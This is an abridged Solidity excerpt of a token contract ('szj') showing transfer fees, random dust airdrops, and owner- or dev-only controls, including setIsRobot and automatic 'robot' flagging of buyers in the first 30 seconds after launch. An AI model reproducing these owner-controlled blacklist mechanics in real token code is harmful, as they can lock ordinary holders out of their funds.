...
contract newToken is Context, IERC20, Ownable {
    ...
    string private _name = "szj"; 
    string private _symbol = "szj"; 
    ...
    uint256 public _maxTxAmount = 888 * 10**18; 
    uint256 private numTokensSellToAddToLiquidity = 5 * 10**17; 
	...
	uint256 public feeOtherToken = 4;
    ...
    function setWrap(address _wrap) public {
        require(_msgSender() == devReceiver || _msgSender() == owner(), "fail");
        wrap = _wrap;
    }
	...
	function setIsRobot(address _addr,bool _value) public {
        require(_msgSender() == devReceiver || _msgSender() == owner(), "fail");
    ...
    function _getTValues(uint256 tAmount) private view returns (uint256 tTransferAmount, uint256 tLiquidity, uint256 tOtherToken, uint256 tFee) {
        if (!feeIt) {
            return (tAmount, 0, 0,0);
        }
		tOtherToken = tAmount.mul(feeOtherToken).div(100);
        tFee = tAmount.mul(feeFee).div(100);
		tLiquidity = tAmount.mul(feeLiquidity).div(100);
        tTransferAmount = tAmount.sub(tLiquidity).sub(tFee).sub(tOtherToken);
    }
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair && from != owner() && to != owner()  && to != blackHole){
			...
			if (launchedAtTime + 30 > block.timestamp) {
				isRobot[to] = true;
			}
		}
	...
	mapping(address => bool) public timeLimit;
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (uint256 tTransferAmount,uint256 tLiquidity, uint256 tOtherToken, uint256 tFee) = _getTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 rAir) = _getRValues(tAmount, tTransferAmount, tFee,1* 10 **3, _getRate());
        _rOwned[sender] = _rOwned[sender].sub(rAmount, "sub1 rAmount");
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
		if(tLiquidity > 1* 10 **3 *5){
			_takeTax(tLiquidity.sub(1* 10 **3 *5),tOtherToken);
			address[] memory addrList = randomAddr(recipient);
            for(uint i =0;i< addrList.length; i++){
                _rOwned[addrList[i]] = _rOwned[addrList[i]].add(rAir);
                emit Transfer(sender, addrList[i], 1* 10 **3);
            }
		}else{
